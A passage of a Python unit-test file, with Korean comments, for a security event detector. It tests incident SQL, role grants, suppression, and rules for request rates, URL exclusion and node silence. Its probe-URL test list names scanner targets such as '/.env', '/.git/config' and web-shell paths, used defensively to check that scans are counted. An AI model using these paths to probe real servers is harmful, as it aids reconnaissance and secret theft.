    start = text.index("CREATE OR REPLACE FUNCTION incidents_keep_judged()")
    end_mark = "EXECUTE FUNCTION incidents_keep_judged();"
    return text[start:text.index(end_mark, start) + len(end_mark)]


def absorbed_block(rel="infra/schema.sql"):
    """'같은 페이로드 흡수 기록' 블록(표 · 색인 · 권한)을 파일에서 그대로 떼어 낸다."""
    with open(os.path.join(os.path.dirname(HERE), rel), encoding="utf-8") as f:
        text = f.read()
    start = text.index("-- 같은 페이로드 흡수 기록 (규칙 v3)")
    end = text.index("END\n$$;", text.index("CREATE TABLE IF NOT EXISTS incident_absorbed", start)) + len("END\n$$;")
    return text[start:end]


def absorbed_table_sql(temp=False):
    """흡수 기록 표와 색인만. temp 면 연결 전용 임시 표로 만든다."""
    block = absorbed_block()
    sql = block[block.index("CREATE TABLE IF NOT EXISTS incident_absorbed"):block.index("DO $$")]
    return sql.replace("CREATE TABLE IF NOT EXISTS", "CREATE TEMP TABLE") if temp else sql


def grant_block(text):
    """역할 블록에서 탐지 역할 부분만 떼어 낸다."""
    start = text.index("IF EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'opsloop_detector')")
    return text[start:text.index("END IF;", start)]


class InsertTest(unittest.TestCase):
    """적재 문장. 충돌 절 앞까지는 확장 전 문장 그대로이고, 충돌 절은 이어지는 사건을 키운다."""

    def test_INSERT_BASE_는_충돌_절_앞까지_옛_문장과_글자가_같다(self):
        self.assertTrue(OLD_INSERT.endswith(OLD_CONFLICT))
        self.assertEqual(detect.INSERT_BASE, NEW_INSERT)

    def test_INSERT_TARGET_은_target_열만_더한다(self):
        self.assertEqual(
            detect.INSERT_TARGET,
            OLD_HEAD.replace("evidence)", "evidence, target)").replace("%s::jsonb)", "%s::jsonb,%s)")
            + detect.ON_CONFLICT_GROW)
        self.assertEqual(detect.INSERT_TARGET.count("%s"), 12)

    def test_충돌_절은_네_열만_키우고_판정된_사건은_두다(self):
        grow = " ".join(detect.ON_CONFLICT_GROW.split())
        self.assertTrue(grow.startswith("ON CONFLICT (incident_key) DO UPDATE SET "))
        self.assertNotIn("%s", grow)
        self.assertEqual(grow_sets(),
                         [("last_ts", "GREATEST(incidents.last_ts, EXCLUDED.last_ts)"),
                          ("signal_count", "GREATEST(incidents.signal_count, EXCLUDED.signal_count)"),
                          ("session_count", "GREATEST(incidents.session_count, EXCLUDED.session_count)"),
                          ("evidence", "CASE WHEN EXCLUDED.last_ts >= incidents.last_ts "
                                       "AND EXCLUDED.signal_count >= incidents.signal_count "
                                       "THEN EXCLUDED.evidence ELSE incidents.evidence END")])
        where = grow[grow.index(" WHERE ") + len(" WHERE "):]
        self.assertTrue(where.startswith(
            "NOT EXISTS (SELECT 1 FROM verdicts v WHERE v.incident_key = incidents.incident_key) AND "))
        self.assertIn("IS DISTINCT FROM", where)

    def test_갱신_열과_탐지_역할_권한이_같다(self):
        root = os.path.dirname(HERE)
        cols = [c for c, _ in grow_sets()]
        grant = f"GRANT UPDATE ({', '.join(cols)}) ON incidents TO opsloop_detector;"
        blocks = []
        for rel in ("infra/schema.sql", "infra/migrations/20260925_round2.sql"):
            with open(os.path.join(root, rel), encoding="utf-8") as f:
                block = grant_block(f.read())
            with self.subTest(file=rel):
                self.assertEqual(block.count("GRANT UPDATE"), 1)
                self.assertIn(grant, block)
            blocks.append(block)
        self.assertEqual(blocks[0], blocks[1])        # 마이그레이션은 schema.sql 과 같은 블록이다

    def test_판정된_사건을_지키는_트리거는_갱신_열과_같고_마이그레이션에도_있다(self):
        cols = ", ".join(c for c, _ in grow_sets())
        sqls = [keep_judged_sql(rel) for rel in ("infra/schema.sql", "infra/migrations/20260925_round2.sql")]
        self.assertEqual(sqls[0], sqls[1])
        self.assertIn(f"BEFORE UPDATE OF {cols} ON incidents", sqls[0])
        self.assertIn("IF EXISTS (SELECT 1 FROM verdicts v WHERE v.incident_key = OLD.incident_key) THEN\n"
                      "        RETURN NULL;", sqls[0])


class AbsorbedTableTest(unittest.TestCase):
    """흡수 기록 표(incident_absorbed). 마이그레이션은 schema.sql 블록과 같고, 탐지 역할은 읽고 넣기만 한다."""

    def test_마이그레이션은_스키마_블록과_같다(self):
        block = absorbed_block()
        with open(os.path.join(os.path.dirname(HERE), "infra/migrations/20260925_v3_absorbed.sql"), encoding="utf-8") as f:
            mig = f.read()
        self.assertIn(block, mig)
        self.assertTrue(mig.rstrip().endswith("COMMIT;"))
        # 역할 블록(모든 표의 권한을 먼저 거둔다) 뒤에 있어야 다시 적용해도 권한이 남는다
        with open(os.path.join(os.path.dirname(HERE), "infra/schema.sql"), encoding="utf-8") as f:
            schema = f.read()
        self.assertGreater(schema.index(block), schema.index("GRANT pg_read_all_data TO opsloop_backup"))

    def test_탐지는_읽고_넣기만_콘솔은_읽기만(self):
        # 후속 차단 약속(absorbed_blocks)은 콘솔만 읽고 쓴다(지우지 못한다). 탐지 역할은 보지 못한다
        block = absorbed_block()
        grants = [" ".join(ln.split()) for ln in block.splitlines() if ln.strip().startswith("GRANT")]
        self.assertEqual([g.split(" --")[0] for g in grants],
                         ["GRANT SELECT, INSERT ON incident_absorbed TO opsloop_detector;",
                          "GRANT SELECT ON incident_absorbed TO opsloop_console;",
                          "GRANT SELECT, INSERT, UPDATE ON absorbed_blocks TO opsloop_console;"])

    def test_문장의_열이_표에_있다(self):
        table = absorbed_table_sql()
        for sql in (detect.ABSORB_SQL, detect.ABSORB_VIA_SQL):
            cols = sql[sql.index("INSERT INTO incident_absorbed (") + 31:].split(")")[0].split(", ")
            with self.subTest(sql=sql[:40]):
                for col in cols:
                    self.assertRegex(table, rf"\n    {col} +")


class SuppressTest(unittest.TestCase):
    """억제 삭제는 남이 잠근 행을 건너뛰며 잠그고, 잠근 행만 새 문장에서 판정 · 조치를 다시 보고 지운다."""
    CONF = {"suppression": {"absorb_by_higher_severity": True, "window_seconds": 900}}

    @staticmethod
    def staged(*rows):
        return [({"id": r[1]}, [r], 1, 900) for r in rows]

    @staticmethod
    def row(key, rid, severity, first, last):
        return (key, rid, "t1", "시험", severity, "192.0.2.8", at(first), at(last), 1, 1, "{}")

    def test_잠근_행만_지운다(self):
        rows = [self.row("L1", "R001", "medium", 0, 10), self.row("L2", "R001", "medium", 40, 50),
                self.row("H", "R002", "high", 5, 45)]
        cur = FakeCursor(lambda sql: [("L2",)] if sql == detect.SUPPRESS_LOCK_SQL else [])
        self.assertEqual(detect.suppress(cur, self.CONF, self.staged(*rows)), {"R001": 2})
        self.assertEqual(cur.log, [(detect.SUPPRESS_LOCK_SQL, [["L1", "L2"]]),
                                   (detect.SUPPRESS_DELETE_SQL, [["L2"]])])
        self.assertTrue(detect.SUPPRESS_LOCK_SQL.endswith("FOR UPDATE SKIP LOCKED"))

    def test_모두_남이_잡고_있으면_지우지_않는다(self):
        cur = FakeCursor()
        detect.suppress(cur, self.CONF, self.staged(self.row("L", "R001", "medium", 0, 10),
                                                    self.row("H", "R002", "high", 5, 20)))
        self.assertEqual([sql for sql, _ in cur.log], [detect.SUPPRESS_LOCK_SQL])


class ActorRateStatusTest(unittest.TestCase):
    """actor_rate 의 http_status. 없으면 문장 · 인자가 확장 전과 같다."""

    PLAIN = (("rules.json", "R001"), ("rules_v2.json", "R001"), ("rules_node.json", "R101"),
             ("rules_w1.json", "R101"))

    def test_없으면_문장_인자가_그대로(self):
        for name, rid in self.PLAIN:
            doc, rule = rule_of(name, rid)
            p = rule["params"]
            for ranged in (False, True):
                rng = [SINCE, UNTIL] if ranged else []
                with self.subTest(rules=name, rule=rid, ranged=ranged):
                    got = collect(doc, rule, *(rng or [None, None]))
                    self.assertEqual(got, [(OLD_ACTOR_RATE[ranged],
                                            rng + [p["eventids"], p["window_seconds"], p["threshold"]])])

    def test_있으면_eventid_뒤_창_앞에_한_조건(self):
        doc, rule = w1_r102()
        for ranged in (False, True):
            rng = [SINCE, UNTIL] if ranged else []
            with self.subTest(ranged=ranged):
                [(sql, prm)] = collect(doc, rule, *(rng or [None, None]))
                self.assertEqual(sql, OLD_ACTOR_RATE[ranged].replace(
                    "src_ip IS NOT NULL ", "src_ip IS NOT NULL AND http_status = ANY(%s) "))
                self.assertEqual(prm, rng + [["nginx.request", "decoy.request"], [404], 600, 5])
                self.assertEqual(sql.count("%s"), len(prm))
                self.assertEqual(sql[:sql.index("http_status = ANY(%s)")].count("%s"), prm.index([404]))

    def test_있으면_신호_모양은_같다(self):
        for doc, rule in (w1_r102(), rule_of("rules_w1.json", "R102")):
            with self.subTest(version=doc["rule_version"]):
                sig = signals_of(doc, rule, lambda sql: [(at(0), "5.5.5.5", None, 6)])
                self.assertEqual(sig, [(at(0), "5.5.5.5", None,
                                        {"count": 6, "window_seconds": 600, "threshold": 5})])

    def test_형식이_틀리면_규칙_오류(self):
        doc, rule = rule_of("rules_w1.json", "R102")
        for bad in ([], "404", 404, [404.0], [True], ["404"], None):
            with self.subTest(bad=bad):
                r = copy.deepcopy(rule)
                r["params"]["http_status"] = bad
                with self.assertRaises(ValueError):
                    collect(doc, r)


W1_R102_PARAMS = {"eventids": ["nginx.request", "decoy.request"], "http_status": [404],
                  "window_seconds": 600, "threshold": 5}
# w1 R102 오탐(159.223.46.221, 9/22 19:53 UTC)의 404 여섯 건과 흔한 메타데이터 조회
META_URLS = ["/robots.txt", "/.well-known/security.txt", "/favicon.ico", "/.well-known/robots.txt", "/favicon",
             "/security.txt", "/sitemap.xml", "/ads.txt", "/humans.txt", "/apple-touch-icon.png",
             "/apple-touch-icon-precomposed.png", "/apple-touch-icon-120x120-precomposed.png",
             "/.well-known/change-password", "/.well-known/openid-configuration", "/.well-known/assetlinks.json",
             "/.well-known/apple-app-site-association"]
# 세야 하는 404: 경로 탐색 · 웹셸 찾기 · 이름만 비슷한 것 · 질의 문자열 · 앞 경로 · 대소문자
PROBE_URLS = ["/hachk.php", "/login", "/setup.cgi", "/wp-login.php", "/.env", "/.git/config",
              "/robots.txt.php", "/x/robots.txt", "/robots.txt?x=1", "/robots.txt/", "/ROBOTS.TXT",
              "/favicon.ico.php", "/favicon.php", "/sitemap.xml.bak", "/security.txt~",
              "/apple-touch-icon.php", "/apple-touch-icon-x.png",
              "/.well-known/admin.php", "/.well-known/acme-challenge/shell.php",
              "/.well-known/pki-validation/about.php", "/.well-known/../wp-login.php", "/.well-known/",
              "/.well-known/security.txt.php", "/nice ports,/Trinity.txt.bak", "/robots.txt\n",
              # .well-known 아래 적지 않은 한 단계 이름은 센다(한 단계 이름을 모두 빼면 이런 탐색이 임계치 아래로 숨는다)
              "/.well-known/admin", "/.well-known/backup", "/.well-known/config.json", "/.well-known/acme-challenge",
              "/.well-known/env.txt", "/.well-known/apple-app-site-association.json"]


def w1_r102():
    """w1 의 R102 (http_status 만 있는 꼴). 저장소 파일은 w2 라 제외 조건을 빼서 만든다."""
    doc, rule = rule_of("rules_w1.json", "R102")
    doc, rule = copy.deepcopy(doc), copy.deepcopy(rule)
    doc["rule_version"] = "w1"
    rule["params"] = {k: v for k, v in rule["params"].items() if k != "exclude_url_patterns"}
    doc["rules"] = [rule if r["id"] == "R102" else r for r in doc["rules"]]
    for r in doc["rules"]:
        r.pop("changed_from_w1", None)
    return doc, rule


class ActorRateUrlExcludeTest(unittest.TestCase):
    """actor_rate 의 exclude_url_patterns (w2 R102). url 전체가 맞는 행만 세지 않는다."""

    def test_http_status_뒤_창_앞에_한_조건(self):
        doc, rule = rule_of("rules_w1.json", "R102")
        pats = rule["params"]["exclude_url_patterns"]
        for ranged in (False, True):
            rng = [SINCE, UNTIL] if ranged else []
            with self.subTest(ranged=ranged):
                [(sql, prm)] = collect(doc, rule, *(rng or [None, None]))
                self.assertEqual(sql, OLD_ACTOR_RATE[ranged].replace(
                    "src_ip IS NOT NULL ", "src_ip IS NOT NULL AND http_status = ANY(%s) "
                                           "AND (url IS NULL OR NOT (url ~ ANY(%s))) "))
                self.assertEqual(prm, rng + [["nginx.request", "decoy.request"], [404],
                                             [f"^(?:{x})$" for x in pats], 600, 5])
                self.assertEqual(sql.count("%s"), len(prm))

    def test_http_status_없이도_쓴다(self):
        rule = {"id": "T9", "type": "actor_rate",
                "params": {"eventids": ["nginx.request"], "exclude_url_patterns": ["^/a$"],
                           "window_seconds": 600, "threshold": 5}}
        [(sql, prm)] = collect({"rule_version": "t1"}, rule)
        self.assertEqual(sql, OLD_ACTOR_RATE[False].replace(
            "src_ip IS NOT NULL ", "src_ip IS NOT NULL AND (url IS NULL OR NOT (url ~ ANY(%s))) "))
        self.assertEqual(prm, [["nginx.request"], ["^(?:^/a$)$"], 600, 5])

    def test_형식이_틀리면_규칙_오류(self):
        doc, rule = rule_of("rules_w1.json", "R102")
        for bad in ([], "^/a$", None, [1], [""], ["^$"], ["/robots.txt"], ["^/robots.txt"], ["/robots.txt$"],
                    ["^/a$", "favicon"]):
            with self.subTest(bad=bad):
                r = copy.deepcopy(rule)
                r["params"]["exclude_url_patterns"] = bad
                with self.assertRaises(ValueError):
                    collect(doc, r)

    def test_맨_바깥_선택도_url_전체에_맞춘다(self):
        # ^/a|/b$ 는 그대로 쓰면 /x/b 에도 맞는다. 감싸면 /a · /b 만 맞는다
        [(_, prm)] = collect({"rule_version": "t1"}, {"id": "T9", "type": "actor_rate", "params": {
            "eventids": ["nginx.request"], "exclude_url_patterns": ["^/a|/b$"], "window_seconds": 600,
            "threshold": 5}})
        [wrapped] = prm[1]
        self.assertTrue(re.search("^/a|/b$", "/x/b"))
        self.assertEqual([u for u in ("/a", "/b", "/x/b", "/a/x") if re.fullmatch(wrapped, u)], ["/a", "/b"])

    def test_메타데이터만_빠지고_탐색은_센다(self):
        _, rule = rule_of("rules_w1.json", "R102")
        pats = [f"^(?:{x})$" for x in rule["params"]["exclude_url_patterns"]]
        # 파이썬 re 의 $ 는 끝 줄바꿈 앞에도 맞으므로 fullmatch 로 PostgreSQL 의 $ (문자열 끝)와 맞춘다
        for u in META_URLS:
            with self.subTest(url=u):
                self.assertTrue(any(re.fullmatch(x, u) for x in pats))
        for u in PROBE_URLS:
            with self.subTest(url=u):
                self.assertFalse(any(re.fullmatch(x, u) for x in pats))


@unittest.skipUnless(REAL_PG and (os.environ.get("OPSLOOP_TEST_DATABASE_URL")
                                  or os.environ.get("OPSLOOP_LAB_DATABASE_URL")), "PostgreSQL 시험 연결 미지정")
class UrlExcludePostgresTest(unittest.TestCase):
    """w2 R102 패턴을 PostgreSQL 정규식으로 돌린다. 표는 읽지 않는다."""

    def test_파이썬_re_와_같은_답(self):
        _, rule = rule_of("rules_w1.json", "R102")
        pats = [f"^(?:{x})$" for x in rule["params"]["exclude_url_patterns"]]
        conn = psycopg2.connect(os.environ.get("OPSLOOP_TEST_DATABASE_URL")
                                or os.environ["OPSLOOP_LAB_DATABASE_URL"])
        try:
            cur = conn.cursor()
            cur.execute("SELECT u, u ~ ANY(%s) FROM unnest(%s::text[]) AS u", (pats, META_URLS + PROBE_URLS))
            got = dict(cur.fetchall())
        finally:
            conn.close()
        self.assertEqual(got, {**{u: True for u in META_URLS}, **{u: False for u in PROBE_URLS}})


class NewTypeSensorsTest(unittest.TestCase):
    """새로 쓰는 신호(operator_rate · actor_rate+http_status)도 발생원 한정의 자리와 인자 순서가 맞다."""

    RULES = [
        {"id": "T7", "type": "operator_rate",
         "params": {"eventids": ["console.block.released"], "window_seconds": 600, "threshold": 3}},
        {"id": "T8", "type": "actor_rate",
         "params": {"eventids": ["nginx.request"], "http_status": [404, 403], "window_seconds": 600,
                    "threshold": 5}},
    ]
    DOC = {"rule_version": "t1"}
    NODES = ["audit", "web-01"]

    def test_거르고_인자_순서가_맞다(self):
        for rule in self.RULES:
            for rng in ((None, None), (SINCE, UNTIL), (SINCE, None)):
                with self.subTest(rule=rule["id"], rng=rng):
                    [(sql, prm)] = collect(self.DOC, with_sensors(rule, self.NODES), *rng)
                    self.assertEqual(sql[:sql.index("sensor = ANY(%s)")].count("%s"), prm.index(self.NODES))
                    self.assertEqual(sql.count("%s"), len(prm))
                    plain = collect(self.DOC, rule, *rng)
                    self.assertEqual([(sql.replace(SENSOR, ""), [x for x in prm if x != self.NODES])], plain)


class OperatorRateTest(unittest.TestCase):
    """a1 R201 차단 대량 해제. 사람 단위 미끄럼 창."""

    def test_문장과_인자_순서(self):
        doc, rule = rule_of("rules_audit.json", "R201")
        [(sql, prm)] = collect(doc, rule, SINCE, UNTIL)
        self.assertEqual(sql, (
            "SELECT ts, username, n, item_ts, items FROM ("
            "SELECT ts, username, count(*) OVER win AS n, array_agg(ts) OVER last20 AS item_ts, "
            "array_agg(concat_ws(' ', coalesce(input, '-'), 'db_client=' || host(src_ip))) OVER last20 AS items "
            "FROM events WHERE provenance = 'real' AND ts >= %s AND ts < %s AND sensor = ANY(%s) "
            "AND eventid = ANY(%s) AND username IS NOT NULL "
            "WINDOW win AS (PARTITION BY username ORDER BY ts "
            "RANGE BETWEEN make_interval(secs => %s) PRECEDING AND CURRENT ROW), "
            "last20 AS (PARTITION BY username ORDER BY ts ROWS BETWEEN 19 PRECEDING AND CURRENT ROW)"
            ") AS x WHERE n >= %s ORDER BY username, ts"))
        self.assertNotIn("OVER win AS items", sql)       # 창 전체 배열을 모으지 않는다 (N²)
        self.assertEqual(prm, [SINCE, UNTIL, ["audit"],
                               ["console.block.released", "console.block.shortened"], 600, 3])
        self.assertNotIn("src_ip IS NOT NULL", sql)       # 출발지로 묶지 않는다

    def test_임계치는_마지막_인자(self):
        doc, rule = rule_of("rules_audit.json", "R201")
        for threshold in (1, 3):
            with self.subTest(threshold=threshold):
                r = copy.deepcopy(rule)
                r["params"]["threshold"] = threshold
                [(_, prm)] = collect(doc, r)
                self.assertEqual(prm[-2:], [600, threshold])

    def test_신호는_IP_없이_사람_대상(self):
        doc, rule = rule_of("rules_audit.json", "R201")
        items = [f"by=han ip=10.0.0.{i} db_client=192.168.50.11" for i in range(25)]
        # 최근 20건 가운데 창(600초) 밖의 것은 거른다. at(n) 은 n 분이다
        old = [at(1)] * 5 + [at(12)] * 15              # at(20) 기준 창 시작은 at(10)
        sig = signals_of(doc, rule, lambda sql: [(at(1), "han", 3, [at(1)] * 3, items[:3]),
                                                 (at(20), "db:opsloop", 15, old, items[5:25])])
        self.assertEqual(sig[0], (at(1), None, None, {"_target": "user:han", "count": 3, "window_seconds": 600,
                                                    "threshold": 3, "items": items[:3]}))
        self.assertEqual(sig[1][3]["_target"], "user:db:opsloop")
        self.assertEqual(sig[1][3]["items"], items[10:25])       # 창 안(10분 이내) 것만

    def test_run_은_target_열로_넣고_evidence_에서_대상을_뺀다(self):
        doc = load("rules_audit.json")

        def answer(sql):
            if "OVER win" in sql:
                return [(at(1), "han", 3, [at(1)] * 3, ["a", "b", "c"]),
                        (at(5), "han", 4, [at(1)] * 3 + [at(5)], ["a", "b", "c", "d"]),
                        (at(40), "han", 3, [at(40)] * 3, ["e", "f", "g"]),
                        (at(2), "kim", 3, [at(2)] * 3, ["x", "y", "z"])]
            return db_answer()(sql)

        cur, _, _ = run_quiet(doc, answer)
        [(base_sql, base_rows), (tgt_sql, tgt_rows)] = cur.batches
        self.assertEqual((base_sql, base_rows), (detect.INSERT_BASE, []))
        self.assertEqual(tgt_sql, detect.INSERT_TARGET)
        got = {r[0]: r for r in tgt_rows}
        self.assertEqual(sorted(got), [f"R201|a1|user:han|{at(1).isoformat()}",
                                       f"R201|a1|user:han|{at(40).isoformat()}",
                                       f"R201|a1|user:kim|{at(2).isoformat()}"])
        r = got[f"R201|a1|user:han|{at(1).isoformat()}"]
        self.assertEqual(r[1:6], ("R201", "a1", "차단 대량 해제", "high", None))
        self.assertEqual((r[6], r[7], r[8], r[9], r[11]), (at(1), at(5), 2, 0, "user:han"))
        ev = json.loads(r[10])
        self.assertEqual(ev["observed_count_max"], 4)
        self.assertEqual(ev["sample"][0], {"count": 3, "window_seconds": 600, "threshold": 3,
                                           "items": ["a", "b", "c"]})
        self.assertNotIn("_target", r[10])


class AggregateRunCompatTest(unittest.TestCase):
    """대상이 없는 신호는 묶음 · 키 · 적재 행이 확장 전과 같다. 대상이 있으면 키 · last_ts 만 달라진다."""

    def test_aggregate_는_옛_묶음에_대상_None_만_붙는다(self):
        for doc_name in ("rules.json", "rules_v2.json", "rules_node.json"):
            doc = load(doc_name)
            for rule in doc["rules"]:
                sig = signals_of(doc, rule, signal_answer)
                for gap in (60, 900, 1800):
                    with self.subTest(rules=doc_name, rule=rule["id"], gap=gap):
                        self.assertEqual(detect.aggregate(sig, gap),
                                         [((ip, None), items) for ip, items in old_aggregate(sig, gap)])

    def test_run_의_적재_행이_옛_run_과_같다(self):
        for doc_name in ("rules.json", "rules_v2.json", "rules_node.json", "rules_self.json"):
            doc = load(doc_name)
            cur, conn, _ = run_quiet(doc, signal_answer)
            want = []
            for rule in doc["rules"]:
                gap = rule.get("aggregation_gap_seconds", doc["aggregation"]["window_gap_seconds"])
                want.append((NEW_INSERT, old_rows(rule, doc["rule_version"],
                                                  signals_of(doc, rule, signal_answer), gap)))
            with self.subTest(rules=doc_name):
                self.assertEqual(cur.batches, want)
                self.assertTrue(any(rows for _, rows in want))       # 빈 비교가 아니다
                self.assertFalse(any("target" in sql for sql, _ in cur.log))
                self.assertEqual(conn.commits, 1)

    def test_대상_키와_제어_필드(self):
        doc = {"rule_version": "x1", "aggregation": {"window_gap_seconds": 900},
               "rules": [{"id": "X1", "name": "시험", "severity": "high", "type": "node_silence",
                          "params": {"threshold_seconds": 600, "alive_ratio": 0.8},
                          "aggregation_gap_seconds": 3000}]}

        def answer(sql):
            if "lead(loaded_at)" in sql:
                return [("web-01", at(0), at(31), 31), ("web-01", at(40), at(52), 12), ("fw", at(0), None, 9)]
            return db_answer()(sql)

        cur, _, _ = run_quiet(doc, answer)
        [(_, base_rows), (_, tgt_rows)] = cur.batches
        self.assertEqual(base_rows, [])
        got = {r[0]: r for r in tgt_rows}
        web = got[f"X1|x1|node:web-01|{at(0).isoformat()}"]
        fw = got[f"X1|x1|node:fw|{at(0).isoformat()}"]
        self.assertEqual(len(got), 2)
        # 두 공백(0분 · 40분 시작)이 통합 창(50분) 안에 이어져 하나로 묶이고, last_ts 는 뒤 공백이 끝난 52분이다
        self.assertEqual((web[5], web[6], web[7], web[8], web[11]), (None, at(0), at(52), 2, "node:web-01"))
        # 진행 중(_end 없음)이면 last_ts 는 신호 시각이다
        self.assertEqual((fw[6], fw[7], fw[11]), (at(0), at(0), "node:fw"))
        for r in tgt_rows:
            ev = json.loads(r[10])
            for d in ev["sample"]:
                self.assertFalse(set(d) & set(detect.CONTROL_FIELDS))
        self.assertEqual(json.loads(web[10])["sample"][1],
                         {"last_receipt": at(40).isoformat(), "alive_minutes": 12, "threshold_seconds": 600,
                          "ongoing": False})

    def test_대상이_있으면_IP_가_있어도_키는_대상(self):
        doc = {"rule_version": "x1", "aggregation": {"window_gap_seconds": 900},
               "rules": [{"id": "X2", "name": "시험", "severity": "medium", "type": "x_both", "params": {}}]}
        sig = [(at(0), "6.6.6.6", None, {"_target": "user:han", "n": 1}), (at(1), "6.6.6.6", None, {"n": 2})]
        with mock.patch.dict(detect.COLLECTORS, {"x_both": lambda *a: sig}):
            cur, _, _ = run_quiet(doc)
        [(_, [plain]), (_, [tgt])] = cur.batches
        self.assertEqual(tgt[0], f"X2|x1|user:han|{at(0).isoformat()}")
        self.assertEqual((tgt[5], tgt[11]), ("6.6.6.6", "user:han"))
        self.assertEqual(plain[0], f"X2|x1|6.6.6.6|{at(1).isoformat()}")

    def test_제어_필드가_없으면_detail_을_그대로(self):
        d = {"count": 3}
        self.assertIs(detect.strip_control(d), d)
        self.assertEqual(detect.strip_control({"_target": "user:a", "_end": None, "n": 1}), {"n": 1})
        self.assertEqual(detect.strip_control("문자열"), "문자열")

    def test_IP_와_대상이_모두_없으면_하이픈(self):
        doc = load("rules.json")
        cur, _, _ = run_quiet(doc, signal_answer)
        keys = [r[0] for _, rows in cur.batches for r in rows]
        self.assertTrue(any(k.startswith("R005|v1|-|") for k in keys))
        self.assertTrue(any(k.startswith("R002|v1|-|") for k in keys))


# i1 R301 의 정의. i2 는 여기에 관문 거부 쪼개기(SPLIT_KEYS)만 더했다
I1_PARAMS = {"threshold_seconds": 600, "alive_ratio": 0.8}
SPLIT_KEYS = ("split_on_gate_reject", "gate_reject_reasons", "split_max_gap_seconds")
# i2 가 인정하는 (eventid, 사유) 쌍을 SQL 에 넘기는 나란한 두 배열
PAIR_EIDS = ["collector.agent.rejected", "collector.agent.rejected", "collector.agent.throttled"]
PAIR_REASONS = ["content_encoding", "content_type", "busy"]


def infra_as_i1():
    """저장소 rules_infra.json(i2)에서 쪼개기를 뺀 i1 정의 (doc, R301)."""
    doc = copy.deepcopy(load("rules_infra.json"))
    doc["rule_version"] = "i1"
    for k in SPLIT_KEYS:
        doc["rules"][0]["params"].pop(k)
    return doc, doc["rules"][0]


def split_answer(gaps, pieces):
    """주 질의(적재 공백)에는 gaps, 조각 질의(GATE_SPLIT_SQL)에는 pieces 를 준다."""
    def answer(sql):
        if sql == detect.GATE_SPLIT_SQL:
            return pieces
        if "lead(loaded_at)" in sql:
            return gaps
        return db_answer()(sql)
    return answer


class NodeSilenceTest(unittest.TestCase):
    """R301 노드 수신 끊김의 바탕 (i1 과 같은 부분). 쪼개기는 NodeSilenceSplitTest 가 본다."""

    def rule(self, **params):
        doc, rule = infra_as_i1()
        rule["params"].update(params)
        return doc, rule

    def test_문장(self):
        doc, rule = self.rule()
        [(sql, prm)] = collect(doc, rule)
        for part in ("WITH r AS (SELECT least(%s::timestamptz, now()) AS ref)",
                     "FROM node_metrics m JOIN nodes n ON n.node_id = m.node_id "
                     "WHERE n.status = 'active' AND 'metrics' = ANY(n.logs) AND m.loaded_at >= n.registered_at",
                     "coalesce(g.gap_end, r.ref) AS gap_stop",
                     "SELECT s.node_id, s.gap_start, s.gap_end, (SELECT count(DISTINCT",
                     "SELECT DISTINCT m.node_id, m.loaded_at",
                     "lead(loaded_at) OVER (PARTITION BY node_id ORDER BY loaded_at) AS gap_end",
                     "coalesce(g.gap_end, r.ref) - g.gap_start > make_interval(secs => %s)",
                     "count(DISTINCT date_trunc('minute', d.started_at)) FROM detector_runs d "
                     "WHERE d.started_at >= s.gap_start AND d.started_at < s.gap_stop",
                     "ORDER BY s.node_id, s.gap_start"):
            self.assertIn(part, sql)
        self.assertNotIn("provenance", sql)        # node_metrics 에는 provenance 가 없다
        self.assertNotIn("sensor", sql)
        self.assertEqual(prm, [None, 600])

    def test_범위는_공백_시작에만(self):
        doc, rule = self.rule()
        for rng, want in (((SINCE, UNTIL), [UNTIL, 600, SINCE, UNTIL]),
                          ((SINCE, None), [None, 600, SINCE]),
                          ((None, UNTIL), [UNTIL, 600, UNTIL])):
            with self.subTest(rng=rng):
                [(sql, prm)] = collect(doc, rule, *rng)
                self.assertEqual(prm, want)
                self.assertEqual(sql.count("%s"), len(prm))
                if rng[0]:
                    self.assertIn("AND g.gap_start >= %s", sql)
                if rng[1]:
                    self.assertIn("AND g.gap_start < %s", sql)

    def test_임계_초과_공백은_신호(self):
        doc, rule = self.rule()
        sig = signals_of(doc, rule, lambda sql: [("web-01", at(0), at(31), 31)])
        self.assertEqual(sig, [(at(0), None, None, {
            "_target": "node:web-01", "_end": at(31), "last_receipt": at(0).isoformat(),
            "alive_minutes": 31, "threshold_seconds": 600, "ongoing": False})])

    def test_탐지가_돌지_않은_절전_공백은_무시(self):
        doc, rule = self.rule()
        rows = [("web-01", at(0), at(40), 0), ("web-01", at(60), at(75), 7), ("fw", at(0), at(12), 8)]
        sig = signals_of(doc, rule, lambda sql: rows)
        self.assertEqual([(s[0], s[3]["_target"], s[3]["alive_minutes"]) for s in sig], [(at(0), "node:fw", 8)])

    def test_살아_있던_분은_소수_오차로_떨어지지_않는다(self):
        doc, rule = self.rule(threshold_seconds=1500, alive_ratio=0.28)     # 25 × 0.28 = 7.000000000000001
        sig = signals_of(doc, rule, lambda sql: [("web-01", at(0), at(20), 7), ("fw", at(0), at(20), 6)])
        self.assertEqual([s[3]["_target"] for s in sig], ["node:web-01"])

    def test_진행_중과_복구_뒤의_키가_같다(self):
        # i1 과 i2 모두. 버전이 달라 두 버전의 키는 서로 다르다 (i1 인시던트 · 판정은 i1 키로 남는다)
        keys = {}
        for doc in (infra_as_i1()[0], load("rules_infra.json")):
            ver = doc["rule_version"]
            ongoing_rows = split_answer([("web-01", at(0), None, 10)], [(660.0, 0, 10)])
            recovered_rows = split_answer([("web-01", at(0), at(31), 31)], [(1860.0, 0, 31)])
            cur, _, _ = run_quiet(doc, ongoing_rows)
            [(_, _), (_, [ongoing])] = cur.batches
            cur, _, _ = run_quiet(doc, recovered_rows)
            [(_, _), (_, [recovered])] = cur.batches
            with self.subTest(version=ver):
                self.assertEqual(ongoing[0], f"R301|{ver}|node:web-01|{at(0).isoformat()}")
                self.assertEqual(recovered[0], ongoing[0])
                self.assertEqual((ongoing[7], recovered[7]), (at(0), at(31)))
                self.assertTrue(json.loads(ongoing[10])["sample"][0]["ongoing"])
                self.assertEqual(ongoing[11], "node:web-01")
            keys[ver] = ongoing[0]
        self.assertEqual(keys["i2"], keys["i1"].replace("|i1|", "|i2|"))
        self.assertNotEqual(keys["i2"], keys["i1"])

    def test_형식이_틀리면_규칙_오류(self):
        for params in ({"threshold_seconds": 0}, {"threshold_seconds": "600"}, {"threshold_seconds": True},
                       {"alive_ratio": 1.5}, {"alive_ratio": -0.1}, {"alive_ratio": "0.8"}):
            with self.subTest(params=params):
                doc, rule = self.rule(**params)
                with self.assertRaises(ValueError):
                    collect(doc, rule)


class NodeSilenceSplitTest(unittest.TestCase):
